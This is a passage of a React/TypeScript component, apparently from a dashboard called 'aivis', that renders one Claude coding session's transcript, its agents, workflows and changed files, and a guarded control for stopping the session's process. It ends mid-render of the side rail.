import { useCallback, useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react'
import Markdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import type {
  AskDecision,
  AskQuestion,
  BackgroundTask,
  ChangeBase,
  ChangeSet,
  DriverStatus,
  EntryImage,
  PendingAsk,
  Session,
  Subagent,
  TranscriptEntry,
  TranscriptPage,
  WorkflowRun,
} from '../../shared/types.ts'
import {
  bytes as formatBytes,
  clock,
  contextNote,
  homePath,
  model,
  tokens,
  toolSummary,
} from '../format.ts'
import { WorkflowCrumbs, WorkflowRail, initialView, type WfView } from './WorkflowRail.tsx'
import { stillFollowing } from '../follow.ts'
import { isImageFile, readImageFile, sizeLabel, type Attachment } from '../images.ts'
import { MentionMenus, useMentions } from '../mentions.tsx'
import { classifyImageSource } from '../imageSource.ts'
import { useDefaults } from '../useDefaults.ts'
import type { ConnectionState } from '../useFleet.ts'
import { SubagentCrumbs, SubagentRail, type SubView } from './SubagentRail.tsx'
import { BlockMeter } from './BlockMeter.tsx'
import { RunningTasks } from './RunningTasks.tsx'
import { DiffView } from './DiffView.tsx'
import { ChangesCrumbs, ChangesRail, type ChangesView } from './ChangesRail.tsx'
import { sessionChanges, type TouchedFile } from '../changes.ts'
import { toolDiffs } from '../diff.ts'

/**
 * Entries a session page asks for.
 *
 * The largest transcripts on a machine come to a couple of thousand entries, so this is a
 * ceiling rather than a page size: it exists so a runaway session cannot hand the browser
 * an unbounded list, not to make you page through history.
 */
const BASE_LIMIT = 5000

/** What the server calls a session whose first prompt it has not read. */
const NO_TITLE = '(no prompt yet)'

/** One pid `/end` declined to signal, and the reason it gave. */
interface EndRefusal {
  pid: number
  reason: string
}

/**
 * What each refusal from `/end` means to whoever is reading the page.
 *
 * The server answers 200 for a request that stopped nothing, because declining to signal a
 * process is a considered outcome rather than a failure of the request; the reason it gives
 * is therefore the whole of the news, and reducing it to "could not finish the session"
 * would leave the reader with a session still running and no idea why. The reasons mirror
 * `SkipReason` in server/terminate.ts, restated here because the browser bundle does not
 * reach into the server, and read as plain strings so a reason a newer server knows about
 * still produces a sentence rather than nothing.
 */
const END_REFUSALS: Record<string, string> = {
  'implausible-pid': 'the recorded pid cannot name a running process',
  repeated: 'the same pid was listed twice, and was dealt with the first time',
  'aivis-itself': 'that pid is the aivis server itself',
  'aivis-ancestor': 'aivis is running under that process — stopping it would stop aivis too',
  'already-gone': 'it had already exited',
  'not-claude': 'that pid no longer belongs to a Claude process',
  'non-interactive':
    'it is a headless claude --print, which aivis only stops when it started the process itself',
  'signal-failed': 'the operating system refused the signal',
}

/** The sentence for one refusal, naming the reason even when this build does not know it. */
function endRefusalText({ pid, reason }: EndRefusal): string {
  return `pid ${pid}: ${END_REFUSALS[reason] ?? `aivis left it alone (${reason})`}`
}

/**
 * How often the sidecars are re-read while work runs outside the turn.
 *
 * A run's agents are read from their transcripts, so this is not free the way the fleet
 * socket is; it is also the only way anything on this page moves while the transcript is
 * finished. A few seconds is slower than the run changes and faster than anyone waits.
 */
const BACKGROUND_POLL_MS = 5000

/**
 * How often the conversation is re-read while a `!` command is still running.
 *
 * Faster than the background poll above because this one is watching something the reader
 * started a second ago and is waiting on, rather than work that reports back on its own.
 */
const BASH_POLL_MS = 1500

interface AgentsPayload {
  subagents: Subagent[]
  workflows: WorkflowRun[]
}

/**
 * What the work running behind the turn can be asked, and where to go to ask it.
 *
 * The status row knows a workflow is running because the transcript says a call went out
 * and no notice came back — which is the whole of what the transcript knows. The rail has
 * read the run itself, so it can say how many of its agents have come back, and that is the
 * difference between knowing something is happening and knowing whether to wait for it.
 *
 * Which list to open follows what is actually outstanding rather than what the session has
 * ever recorded, so a backgrounded command does not offer to show you a workflow that
 * finished this morning.
 */
function watching(
  agents: AgentsPayload,
  tasks: BackgroundTask[],
): { tab: RailTab; step: string | null } | null {
  const tools = new Set(tasks.map((task) => task.tool))
  if (tools.has('Workflow') && agents.workflows.length > 0) {
    const run = agents.workflows.find((entry) => entry.live)
    if (!run) return { tab: 'workflows', step: null }
    const back = run.agents.filter((agent) => agent.state !== 'running').length
    // The run knows how many it started even where the read stopped short of all of them.
    const total = Math.max(run.agentCount, run.agents.length)
    return { tab: 'workflows', step: `${back}/${total} agents` }
  }
  if ((tools.has('Agent') || tools.has('Task')) && agents.subagents.length > 0) {
    const going = agents.subagents.filter((agent) => agent.status === 'running').length
    return { tab: 'agents', step: going > 0 ? `${going} running` : null }
  }
  // A backgrounded command has nowhere to go: the row says what it is and when it started,
  // and there is no list of it to open.
  return null
}

/**
 * A full-page view of one session: its conversation, the agents and workflows running
 * inside it, and a composer for sending the session another message.
 *
 * Everything refetches when the session's last activity changes, which the fleet
 * WebSocket already reports, so one live channel drives the whole page.
 */
export function SessionPage({
  session,
  driver,
  connection,
  onBack,
}: {
  session: Session
  driver: DriverStatus | undefined
  connection: ConnectionState
  onBack: () => void
}): React.JSX.Element {
  const [page, setPage] = useState<TranscriptPage | null>(null)
  const [agents, setAgents] = useState<AgentsPayload>({ subagents: [], workflows: [] })
  const [limit, setLimit] = useState(BASE_LIMIT)
  const [error, setError] = useState<string | null>(null)
  const [rail, setRail] = useState<RailTab | null>(null)
  // A directory outside git can only be asked what the session itself wrote.
  const [changeBase, setChangeBase] = useState<ChangeBase>(session.git.isRepo ? 'start' : 'session')
  const [changes, setChanges] = useState<ChangeSet | null>(null)
  // null when idle; 'ask' while confirming, 'busy' while stopping, 'warn' when the server
  // came back saying the directory holds more than one live session, or saying it stopped
  // nothing at all.
  const [ending, setEnding] = useState<'ask' | 'busy' | 'warn' | null>(null)
  const [endWarning, setEndWarning] = useState<number[]>([])
  // The pids `/end` declined to signal, with the reason each was left alone. Kept apart from
  // `endWarning` because the two warnings ask different things of the reader: the ambiguity
  // one offers to go ahead anyway, this one has nothing left to offer.
  const [endRefusals, setEndRefusals] = useState<EndRefusal[]>([])
  const bodyRef = useRef<HTMLDivElement>(null)
  /** Whether the page is following the end of the conversation. */
  const followRef = useRef(true)
  /** Where the last scroll left the reader, which is what makes a direction out of two. */
  const lastTopRef = useRef(0)

  const load = useCallback(
    async (requestLimit: number) => {
      try {
        const [transcript, sidecars] = await Promise.all([
          fetch(`/api/sessions/${encodeURIComponent(session.id)}/transcript?limit=${requestLimit}`),
          fetch(`/api/sessions/${encodeURIComponent(session.id)}/agents`),
        ])
        if (!transcript.ok) throw new Error(`server returned ${transcript.status}`)
        setPage((await transcript.json()) as TranscriptPage)
        if (sidecars.ok) setAgents((await sidecars.json()) as AgentsPayload)
        setError(null)
      } catch (err) {
        setError(String(err))
      }
    },
    [session.id],
  )

  useEffect(() => {
    void load(limit)
  }, [load, limit, session.lastActivityAt])

  /**
   * Keep reading while work runs outside the turn.
   *
   * Everything else on this page refetches when the session's last activity moves, which is
   * the whole point of driving it from the fleet socket rather than a timer. A handed-off
   * workflow moves nothing: the turn that launched it ended, so the transcript is finished
   * writing until the work reports back — and for as long as that takes, the run is
   * advancing behind a page that has stopped asking. So while something is outstanding, and
   * only then, the sidecars are re-read on their own.
   */
  const outstanding = (session.background ?? []).length > 0
  useEffect(() => {
    if (!outstanding) return
    const timer = setInterval(() => void load(limit), BACKGROUND_POLL_MS)
    return () => clearInterval(timer)
  }, [load, limit, outstanding])

  /**
   * Keep reading while a `!` command runs.
   *
   * A run is the daemon's own state until it is sent, so nothing about it moves the
   * session's last activity and the effect above never fires. Without this the command
   * would sit at `running` on screen until something else happened to refresh the page.
   */
  const bashRunning = (page?.entries ?? []).some((entry) => entry.kind === 'bash' && entry.running)
  useEffect(() => {
    if (!bashRunning) return
    const timer = setInterval(() => void load(limit), BASH_POLL_MS)
    return () => clearInterval(timer)
  }, [load, limit, bashRunning])

  /**
   * Read what changed on disk.
   *
   * This is a git read rather than a transcript read, so it stands on its own: it refetches
   * when the session writes a new turn, and when the base is switched. The server caches it
   * per directory, so several sessions in one repository do not each pay for it.
   */
  useEffect(() => {
    if (changeBase === 'session') return
    let stopped = false
    void (async () => {
      try {
        const response = await fetch(
          `/api/sessions/${encodeURIComponent(session.id)}/changes?base=${changeBase}`,
        )
        if (!response.ok) return
        const body = (await response.json()) as ChangeSet
        if (!stopped) setChanges(body)
      } catch {
        if (!stopped) setChanges(null)
      }
    })()
    return () => {
      stopped = true
    }
  }, [session.id, session.lastActivityAt, changeBase])

  useEffect(() => {
    const previous = document.title
    document.title = `${session.projectName} · aivis`
    return () => {
      document.title = previous
    }
  }, [session.projectName])

  useEffect(() => {
    const onKey = (event: KeyboardEvent): void => {
      // Escape leaves the session, except while something is being typed into it. The
      // composer was the only such field when this was written; the answer card added
      // another, and escaping out of the page mid-answer loses what was typed. Only fields
      // that take text count — the transcript's own filters are inputs too, and ticking one
      // focuses it, so counting those would break escape for anyone who hid a group first.
      const target = event.target
      const typing =
        target instanceof HTMLTextAreaElement ||
        (target instanceof HTMLInputElement && target.type !== 'checkbox' && target.type !== 'radio')
      if (event.key === 'Escape' && !typing) onBack()
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [onBack])

  /**
   * Follow new output, but only while the reader is watching the end, so scrolling back
   * through history is not interrupted when the session writes another turn.
   *
   * The transcript keeps growing taller for a while after it first renders: a screenshot
   * has no height until it loads, and a thousand entries lay out over several frames.
   * Pinning once and trusting it lands part-way up a long session, so the bottom is held
   * until the height stops changing.
   *
   * `instant` because there is nothing to show the reader here — they are already at the
   * end and the page is keeping them there. Correctness no longer depends on it: the scroll
   * handler reads direction rather than position, so an animated pin on its way down cannot
   * be mistaken for the reader leaving. See `web/follow.ts`.
   */
  const pin = useCallback((): void => {
    const body = bodyRef.current
    if (!body || !followRef.current) return
    body.scrollTo({ top: body.scrollHeight, behavior: 'instant' })
    lastTopRef.current = body.scrollTop
  }, [])

  // Before paint rather than after it. A turn can add thousands of pixels at once, and
  // pinning in a plain effect shows the reader one frame of the position they were at
  // before the answer arrived, which reads as the page jumping rather than following.
  useLayoutEffect(() => {
    const body = bodyRef.current
    if (!body) return
    pin()
    const observer = new ResizeObserver(pin)
    // The content growing is the usual reason to re-pin, and the body itself changing height
    // is the other: the status line and the composer above it both change shape at the end
    // of a turn, which moves the bottom without the conversation having grown at all.
    observer.observe(body)
    for (const child of body.children) observer.observe(child)
    return () => observer.disconnect()
  }, [page, pin])

  const onScroll = (): void => {
    const body = bodyRef.current
    if (!body) return
    followRef.current = stillFollowing(followRef.current, lastTopRef.current, {
      top: body.scrollTop,
      height: body.scrollHeight,
      view: body.clientHeight,
    })
    lastTopRef.current = body.scrollTop
  }

  /**
   * Jump the conversation to a tool call the rail is pointing at.
   *
   * Asking to see a call somewhere back in the session is a decision to stop watching the
   * end of it, so following new output stops with it — otherwise the very act of opening
   * the entry grows the transcript and the follow snaps the reader back to the bottom.
   */
  const reveal = useCallback((callId: string): void => {
    revealNode(`tool-${callId}`, 'tool-entry--flash', () => {
      followRef.current = false
    })
  }, [])

  /** The same jump, for a prompt rather than a tool call. */
  const revealPrompt = useCallback((uuid: string): void => {
    revealNode(`entry-${uuid}`, 'entry--flash', () => {
      followRef.current = false
    })
  }, [])

  const copyHandoff = async (): Promise<void> => {
    const response = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/handoff`)
    const body = (await response.json()) as { command?: string }
    if (body.command) await navigator.clipboard.writeText(body.command)
  }

  /** Stop keeping a parked session ready; the next scan files it with the ended ones. */
  const forgetPark = async (): Promise<void> => {
    await fetch(`/api/sessions/${encodeURIComponent(session.id)}/park`, { method: 'DELETE' })
  }

  /**
   * Finish the session, stopping the process behind it.
   *
   * The server refuses when the directory holds more than one live session, because which
   * process belongs to which conversation is not recorded anywhere; that refusal comes back
   * here as a warning to confirm rather than as a failure.
   *
   * It can also accept the request and still stop nothing: every pid it was handed may be one
   * it will not signal — a process aivis runs under, a pid that now belongs to something
   * else, an orphaned `claude --print` left by an earlier aivis. That answer is a 200 with
   * `ended: false`, so the status code alone cannot be read as success; the outcome has to be.
   */
  const endSession = async (force: boolean): Promise<void> => {
    setEnding('busy')
    try {
      const response = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/end`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ force }),
      })
      const detail = (await response.json()) as {
        ambiguous?: boolean
        processes?: number[]
        error?: string
        ended?: boolean
        skipped?: EndRefusal[]
      }
      if (response.status === 409 && detail.ambiguous) {
        setEndWarning(detail.processes ?? [])
        setEndRefusals([])
        setEnding('warn')
        return
      }
      // Nothing was stopped. Closing the bar here would tell the reader the session had
      // finished while the process behind it carries on, so this is a warning that names the
      // pids and repeats the server's reason for each.
      if (response.ok && detail.ended === false) {
        setEndWarning([])
        setEndRefusals(detail.skipped ?? [])
        setEnding('warn')
        return
      }
      setEnding(response.ok ? null : 'warn')
      if (!response.ok) {
        setEndWarning([])
        setEndRefusals([])
      }
    } catch {
      setEnding('warn')
      setEndWarning([])
      setEndRefusals([])
    }
  }

  const toolCalls = (page?.entries ?? []).filter((e) => e.kind === 'tool')
  const prompts = (page?.entries ?? []).filter((e) => e.kind === 'user' || e.kind === 'queued')

  const [shown, setShown] = useState<Record<EntryGroup, boolean>>(storedShown)
  const toggle = (group: EntryGroup): void => {
    setShown((current) => {
      const next = { ...current, [group]: !current[group] }
      try {
        localStorage.setItem(SHOWN_KEY, JSON.stringify(next))
      } catch {
        // A browser with site data blocked simply forgets the choice.
      }
      return next
    })
  }

  // Only groups the session actually has are offered, so a plain conversation is not given
  // three switches for machinery it never ran.
  const present = useMemo(() => {
    const found = new Set<EntryGroup>()
    for (const entry of page?.entries ?? []) {
      const group = entryGroup(entry)
      if (group) found.add(group)
    }
    return found
  }, [page])

  const visible = useMemo(
    () =>
      (page?.entries ?? []).filter((entry) => {
        const group = entryGroup(entry)
        return group === null || shown[group]
      }),
    [page, shown],
  )
  const hiddenCount = (page?.entries.length ?? 0) - visible.length
  /**
   * The page once it holds the session's whole history, or null while it does not.
   *
   * The fleet reads very large transcripts by sampling their head and tail, so the turn
   * and tool counts it reports are lower bounds and are marked with a `≥`. This page
   * reads the file in full, so as soon as it has loaded it knows better than the fleet
   * does and says the exact number instead of a floor.
   */
  const full = page !== null && !page.truncated ? page : null
  // Messages sent from aivis count as prompts too. They reach the session over its socket
  // and are filed as their own kind of record, but somebody typed them.
  const promptCount = full
    ? full.entries.filter((e) => e.kind === 'user' || e.kind === 'queued').length
    : session.userTurns
  const toolCount = full ? toolCalls.length : session.toolCalls
  const approx = full === null && session.sampled
  // The fleet takes a session's title from its first prompt, which a sampled read of a
  // very large transcript never reaches — it reports "(no prompt yet)" beside a count of
  // twenty-seven prompts. The full read has the prompt, so it supplies the title too.
  const firstPrompt = full?.entries.find((entry) => entry.kind === 'user')
  const title =
    session.title === NO_TITLE && firstPrompt?.kind === 'user' && firstPrompt.text.trim()
      ? firstPrompt.text.trim().slice(0, 120)
      : session.title
  const touched = useMemo(
    () => sessionChanges(page?.entries ?? [], session.cwd),
    [page, session.cwd],
  )
  const bases: ChangeBase[] = session.git.isRepo ? ['start', 'head', 'session'] : ['session']
  // Until the git read lands, the session's own edits stand in, so the count is never blank.
  const changedFiles = changeBase === 'session' ? touched.length : (changes?.files.length ?? touched.length)
  const openRail = (tab: RailTab): void => setRail((current) => (current === tab ? null : tab))
  const running = useMemo(() => watching(agents, session.background ?? []), [agents, session.background])

  return (
    <div className="page">
      <header className="page__head">
        <button className="page__back" onClick={onBack} aria-label="Back to the fleet">
          ←
        </button>
        <span className={`dot dot--${session.status}`} />
        <div className="page__ident">
          <h1 className="page__title">{title}</h1>
          <p className="page__path">
            {homePath(session.cwd)}
            {session.git.branch ? <span className="card__branch"> · {session.git.branch}</span> : null}
            <span className="page__id"> · {session.id}</span>
          </p>
        </div>
        {session.status === 'parked' ? (
          <button
            className="handoff"
            title="Stop keeping this session ready. The transcript is untouched — it just files away with the ended ones."
            onClick={() => void forgetPark()}
          >
            forget
          </button>
        ) : null}
        {session.status !== 'ended' ? (
          <button
            className="handoff handoff--end"
            title="Stop the process behind this session so it reads as ended"
            onClick={() => setEnding('ask')}
          >
            end session
          </button>
        ) : null}
        <button className="handoff" onClick={() => void copyHandoff()}>
          copy resume
        </button>
      </header>

      {ending ? (
        <div className={`endbar ${ending === 'warn' ? 'endbar--warn' : ''}`}>
          {ending === 'busy' ? (
            <span>stopping…</span>
          ) : ending === 'warn' && endWarning.length > 0 ? (
            <>
              <span>
                <b>{endWarning.length} Claude processes</b> are running in this directory, and
                which one belongs to this conversation is not recorded anywhere — aivis would be
                guessing. Stop the process it has attributed to this session (pid{' '}
                {session.livePids.join(', ') || '—'})?
              </span>
              <button className="endbar__go" onClick={() => void endSession(true)}>
                stop it anyway
              </button>
              <button className="endbar__no" onClick={() => setEnding(null)}>
                cancel
              </button>
            </>
          ) : ending === 'warn' && endRefusals.length > 0 ? (
            <>
              <span>
                <b>Nothing was stopped</b>, so this session is still running.{' '}
                {endRefusals.map(endRefusalText).join('; ')}.
              </span>
              <button className="endbar__no" onClick={() => setEnding(null)}>
                dismiss
              </button>
            </>
          ) : ending === 'warn' ? (
            <>
              <span>Could not finish the session.</span>
              <button className="endbar__no" onClick={() => setEnding(null)}>
                dismiss
              </button>
            </>
          ) : (
            <>
              <span>
                End <b>{session.title}</b>
                {session.livePids.length > 0 ? ` — pid ${session.livePids.join(', ')} will be stopped` : ''}
                ? The transcript is kept; the conversation can still be resumed later.
              </span>
              <button className="endbar__go" onClick={() => void endSession(false)}>
                end session
              </button>
              <button className="endbar__no" onClick={() => setEnding(null)}>
                cancel
              </button>
            </>
          )}
        </div>
      ) : null}

      <div className="page__meta">
        {session.status === 'working' ? (
          <Working label="working" />
        ) : (
          <span className={`page__status page__status--${session.status}`}>{session.status}</span>
        )}
        {/*
          Beside the status rather than after it, because it often contradicts it: a session
          that launched a workflow reports `idle` while the work it started is still going.
          It says how far along the work is and opens it, because a row that reports
          something is happening and then cannot be asked what is the reason to read on.
        */}
        <RunningTasks
          tasks={session.background ?? []}
          step={running?.step ?? null}
          onOpen={running ? () => openRail(running.tab) : undefined}
        />
        <span>{model(session.model)}</span>
        {session.effort ? (
          <span
            title={
              `The last turn ran at ${session.effort} effort, which is how deeply Claude thinks and how much it spends getting there. ` +
              'It is read from the turn itself, so it follows a mid-session /effort — which you can send from the composer.'
            }
          >
            {session.effort} effort
          </span>
        ) : null}
        <span title={contextNote(session.tokens.contextWindow, session.contextLimit)}>
          {tokens(session.tokens.contextWindow)} / {tokens(session.contextLimit.tokens)} context
        </span>
        <button
          className={`meta-link ${rail === 'prompts' ? 'meta-link--on' : ''}`}
          onClick={() => openRail('prompts')}
          title="Messages you sent. Tool results and Claude's replies are not counted. Open the list to jump between them."
        >
          {approx ? '≥' : ''}
          {promptCount} prompts
        </button>
        <button
          className={`meta-link ${rail === 'tools' ? 'meta-link--on' : ''}`}
          onClick={() => openRail('tools')}
        >
          {approx ? '≥' : ''}
          {toolCount} tools
        </button>
        {agents.subagents.length > 0 ? (
          <button
            className={`meta-link ${rail === 'agents' ? 'meta-link--on' : ''}`}
            onClick={() => openRail('agents')}
          >
            {agents.subagents.length} agents
          </button>
        ) : null}
        {agents.workflows.length > 0 ? (
          <button
            className={`meta-link ${rail === 'workflows' ? 'meta-link--on' : ''}`}
            onClick={() => openRail('workflows')}
          >
            {agents.workflows.length} workflows
          </button>
        ) : null}
        {changedFiles > 0 || touched.length > 0 ? (
          <button
            className={`meta-link ${rail === 'files' ? 'meta-link--on' : ''}`}
            onClick={() => openRail('files')}
            title="Files this session changed, with the diff of each"
          >
            {changedFiles} files
          </button>
        ) : null}
        {session.git.insertions || session.git.deletions ? (
          <span>
            <span className="add">+{session.git.insertions}</span>{' '}
            <span className="del">−{session.git.deletions}</span>
          </span>
        ) : null}
        <BlockMeter />
        {present.size > 0 ? (
          <span className="page__shown">
            {(['tools', 'subagents', 'workflows'] as EntryGroup[])
              .filter((group) => present.has(group))
              .map((group) => (
                <label
                  key={group}
                  className="shown"
                  title={`Show ${group} in the conversation. Hiding them leaves the counts and the panel untouched — it only takes them out of the reading.`}
                >
                  <input type="checkbox" checked={shown[group]} onChange={() => toggle(group)} />
                  {group}
                </label>
              ))}
          </span>
        ) : null}
        {approx ? (
          <span
            className="pill pill--warn"
            title={
              `This transcript is ${formatBytes(session.transcriptBytes)}, too large to read in full. ` +
              'Only its start and end were read, so counts marked with ≥ are lower bounds. ' +
              'Status and current activity are exact.'
            }
          >
            {formatBytes(session.transcriptBytes)} · counts partial
          </span>
        ) : null}
      </div>

      <div className="page__main">
        <div className="page__body" ref={bodyRef} onScroll={onScroll}>
          <div className="page__column">
            {error ? <p className="page__error">Could not read transcript: {error}</p> : null}
            {page?.truncated ? (
              <button className="loadmore" onClick={() => setLimit((n) => n * 4)}>
                load earlier messages
              </button>
            ) : null}
            {page === null && !error ? <p className="page__loading">reading transcript…</p> : null}
            {visible.map((entry) => (
              <Entry key={entry.uuid} entry={entry} cwd={session.cwd} sessionId={session.id} />
            ))}
            {hiddenCount > 0 ? (
              <p className="page__hidden">
                {hiddenCount} {hiddenCount === 1 ? 'entry is' : 'entries are'} hidden
              </p>
            ) : null}
          </div>
        </div>

        {rail ? (
          <Rail
            tab={rail}
            onTab={setRail}
            onClose={() => setRail(null)}
            onReveal={reveal}
            onRevealPrompt={revealPrompt}
            prompts={prompts}
            tools={toolCalls}
            subagents={agents.subagents}
            workflows={agents.workflows}
            sessionId={session.id}
            cwd={session.cwd}
            changes={changes}
            touched={touched}
            changedFiles={changedFiles}
            base={changeBase}
            onBase={setChangeBase}
            bases={bases}
            partial={page?.truncated ?? false}
            onLoadMore={() => setLimit((n) => n * 4)}
          />
        ) : null}
      </div>

      <Composer
        session={session}
        driver={driver}
        connection={connection}
        entries={page?.entries ?? []}
        onRan={() => void load(limit)}
      />
    </div>
  )
}

/** Which list the side rail is showing. */
type RailTab = 'prompts' | 'tools' | 'agents' | 'workflows' | 'files'

/** The kinds of machinery a conversation can be filled with, each hideable on its own. */
type EntryGroup = 'tools' | 'subagents' | 'workflows'

const SHOWN_KEY = 'aivis.shown'

/**
 * Which group an entry belongs to, or null for the conversation itself.
 *
 * Every entry falls in exactly one place, so hiding a group can never leave an orphan
 * behind: a tool call a subagent made belongs to that subagent rather than to the tools,
 * and the `Task` call that started it belongs there too, so turning subagents off takes the
 * whole excursion rather than half of it. Prompts and replies are never in a group, because
 * they are the conversation rather than something laid over it.
 */
function entryGroup(entry: TranscriptEntry): EntryGroup | null {
  if (entry.kind === 'tool') {
    if (entry.call.name === 'Workflow') return 'workflows'
    if (entry.sidechain || entry.call.name === 'Task') return 'subagents'
    return 'tools'
  }
  if (entry.kind === 'assistant' && entry.sidechain) return 'subagents'
  return null
}

/** What the reader last chose to see, remembered across sessions and reloads. */
function storedShown(): Record<EntryGroup, boolean> {
  const all = { tools: true, subagents: true, workflows: true }
  try {
    const raw = localStorage.getItem(SHOWN_KEY)
    if (!raw) return all
    const parsed = JSON.parse(raw) as Partial<Record<EntryGroup, boolean>>
    return {
      tools: parsed.tools !== false,
      subagents: parsed.subagents !== false,
      workflows: parsed.workflows !== false,
    }
  } catch {
    return all
  }
}

const RAIL_WIDTH_KEY = 'aivis.railWidth'
const RAIL_MIN = 480

/**
 * The one label on the page that has to look alive.
 *
 * A session mid-turn and a session that stopped an hour ago both said the same still word,
 * so the page could not be read at a glance: you had to compare timestamps to learn
 * whether anything was happening. Three bars carry the movement and the word behind them
 * takes a slow sweep, which is enough to catch the eye anywhere on the strip without
 * becoming something that has to be looked away from.
 */
function Working({ label }: { label: string }): React.JSX.Element {
  return (
    <span className="working" role="status">
      <span className="working__bars" aria-hidden="true">
        <i />
        <i />
        <i />
      </span>
      <span className="working__text">{label}</span>
    </span>
  )
}

function storedWidth(): number | null {
  try {
    const value = Number(localStorage.getItem(RAIL_WIDTH_KEY))
    return Number.isFinite(value) && value >= RAIL_MIN ? value : null
  } catch {
    return null
  }
}

/**
 * How wide the rail goes when a detail docks beside its list.
 *
 * Two panes need roughly three quarters of the window to both stay readable, but the
 * conversation still has to be worth looking at, so the transcript keeps 360px whatever
 * the window size.
 */
function dockedWidth(): number {
  return Math.min(
    Math.round(window.innerWidth * 0.75),
    Math.max(window.innerWidth - 360, RAIL_MIN),
  )
}

/**
 * Open a tool call in the conversation and scroll it into view.
 *
 * The rail lists tool calls compactly; the full input and output already live in the
 * conversation, so selecting one reveals it there instead of duplicating it here.
 *
 * Opening the entry changes the transcript's height, which is exactly what the follow-new-
 * output observer watches for, so a session sitting at the bottom used to scroll straight
 * back there and swallow the jump. `onStay` is how the caller turns following off first.
 */
function revealNode(domId: string, flash: string, onStay: () => void): void {
  const element = document.getElementById(domId)
  if (!element) return
  onStay()
  if (element instanceof HTMLDetailsElement) element.open = true

  // A smooth scroll is worth having across a screen or two, where it shows the reader which
  // way they went. Across a long session it is neither followable nor reliable: a transcript
  // a million pixels tall keeps changing height underneath the animation, and the browser
  // abandons it — leaving the conversation exactly where it was.
  const distance = Math.abs(element.getBoundingClientRect().top)
  element.scrollIntoView({ behavior: distance > 4000 ? 'instant' : 'smooth', block: 'center' })

  element.classList.add(flash)
  setTimeout(() => element.classList.remove(flash), 1400)
}

/** The tool calls, agents, and workflows of a session, shown beside its conversation. */
function Rail({
  tab,
  onTab,
  onClose,
  onReveal,
  onRevealPrompt,
  prompts,
  tools,
  subagents,
  workflows,
  sessionId,
  cwd,
  changes,
  touched,
  changedFiles,
  base,
  onBase,
  bases,
  partial,
  onLoadMore,
}: {
  tab: RailTab
  onTab: (tab: RailTab) => void
  onClose: () => void
  /** Show a tool call back in the conversation, without the transcript scrolling away again. */
  onReveal: (callId: string) => void
  /** The same, for a prompt. */
  onRevealPrompt: (uuid: string) => void
  prompts: TranscriptEntry[]
  tools: TranscriptEntry[]
  subagents: Subagent[]
  workflows: WorkflowRun[]
  sessionId: string
  cwd: string
  changes: ChangeSet | null
  touched: TouchedFile[]
  changedFiles: number
  base: ChangeBase
  onBase: (base: ChangeBase) => void
  bases: ChangeBase[]
  partial: boolean
  onLoadMore: () => void
}): React.JSX.Element {
  const [width, setWidth] = useState<number | null>(storedWidth)
  const [wfView, setWfView] = useState<WfView>(() => initialView(workflows))
  const [subView, setSubView] = useState<SubView>({ level: 'list' })
  const [changesView, setChangesView] = useState<ChangesView>({ level: 'list' })

  // A file open under one base may not exist under another, so switching goes back to the list.
  useEffect(() => {
    setChangesView({ level: 'list' })
  }, [base])

  // The deepest level of each tab docks its detail beside the level it came from, which
  // needs both panes on screen at once.
  const docked =
    (tab === 'workflows' && wfView.level === 'agent') ||
    (tab === 'agents' && subView.level === 'agent') ||
    (tab === 'files' && changesView.level === 'file')

  // Docking widens the rail and undocking puts it back, so opening a detail does not
  // silently cost the reader the width they chose. Dragging while docked is them saying
  // what they want instead, so it cancels the restore.
  const beforeDock = useRef<number | null | undefined>(undefined)
  useEffect(() => {
    if (docked) {
      if (beforeDock.current !== undefined) return
      beforeDock.current = width
      const target = dockedWidth()
      setWidth((current) => (current === null || current < target ? target : current))
    } else if (beforeDock.current !== undefined) {
      setWidth(beforeDock.current)
      beforeDock.current = undefined
    }
    // `width` is read to remember it, not to react to it, so it is deliberately not a
    // dependency: a drag must not re-run this and overwrite what it remembered.
  }, [docked])

  // `files` is the one tab whose count can be zero while there is still something to see:
  // a session that committed everything has no uncommitted diff but did edit files.
  const tabs: { id: RailTab; label: string; count: number; enabled?: boolean }[] = [
    { id: 'prompts', label: 'prompts', count: prompts.length },
    { id: 'tools', label: 'tools', count: tools.length },
    { id: 'agents', label: 'agents', count: subagents.length },
    { id: 'workflows', label: 'workflows', count: workflows.length },
    { id: 'files', label: 'files', count: changedFiles, enabled: changedFiles > 0 || touched.length > 0 },
  ]

  // Dragging the grip resizes from the right edge of the window, so the width is the
  // distance from the pointer to that edge. Pointer capture keeps the drag alive even
  // when the cursor outruns the handle.
  const startResize = (event: React.PointerEvent<HTMLDivElement>): void => {
    event.preventDefault()
    const grip = event.currentTarget
    grip.setPointerCapture(event.pointerId)

    const onMove = (move: PointerEvent): void => {
      const next = Math.min(
        Math.max(window.innerWidth - move.clientX, RAIL_MIN),
        Math.max(window.innerWidth - 360, RAIL_MIN),
      )
      setWidth(next)
    }
    const onUp = (): void => {
      grip.removeEventListener('pointermove', onMove)
      grip.removeEventListener('pointerup', onUp)
      // A width chosen by hand outlives the docked detail that prompted it.
      beforeDock.current = undefined
      setWidth((current) => {
        try {
          if (current !== null) localStorage.setItem(RAIL_WIDTH_KEY, String(current))
        } catch {
          // A browser with site data blocked simply forgets the width.
        }
        return current
      })
    }
    grip.addEventListener('pointermove', onMove)
    grip.addEventListener('pointerup', onUp)
  }

  return (
    <aside className="rail" style={width === null ? undefined : { width }}>
      <div className="rail__grip" onPointerDown={startResize} title="Drag to resize" />
      <div className="rail__tabs">
        {tabs.map((entry) => (
          <button
            key={entry.id}
            className={`rail__tab ${tab === entry.id ? 'rail__tab--on' : ''}`}
            onClick={() => onTab(entry.id)}
            disabled={!(entry.enabled ?? entry.count > 0)}
          >
            {entry.label}
            <span className="rail__count">{entry.count}</span>
          </button>
        ))}
        <button className="rail__close" onClick={onClose} aria-label="Close the panel">
          ✕
        </button>
      </div>

      {tab === 'workflows' ? (
        <WorkflowCrumbs workflows={workflows} view={wfView} onView={setWfView} />
      ) : null}
      {tab === 'agents' ? (
        <SubagentCrumbs subagents={subagents} view={subView} onView={setSubView} />
      ) : null}
      {tab === 'files' ? (
        <ChangesCrumbs view={changesView} onView={setChangesView} count={changedFiles} />
      ) : null}

      <div className={`rail__body ${docked ? 'rail__body--split' : ''}`}>
        {tab === 'prompts' ? (
